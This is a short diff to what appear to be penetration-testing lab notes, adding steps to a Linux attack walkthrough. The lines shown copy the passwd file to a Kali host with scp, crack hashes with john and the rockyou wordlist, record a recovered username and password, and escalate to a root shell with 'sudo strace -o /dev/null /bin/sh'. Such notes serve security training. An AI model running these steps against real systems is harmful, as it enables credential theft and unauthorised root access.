@@ -31,7 +31,9 @@
 		passwd and shadow file /mnt/backup/etc
 		scp /mnt/backup/etc/passwd kali@192.168.49.102:.
 		john --wordlist=/usr/share/wordlists/rockyou.txt unshade.txt --format=crypt
-		lisa peanut
+		lisa peanut.
+		sudo -l
+		sudo strace -o /dev/null /bin/sh
 
 
 
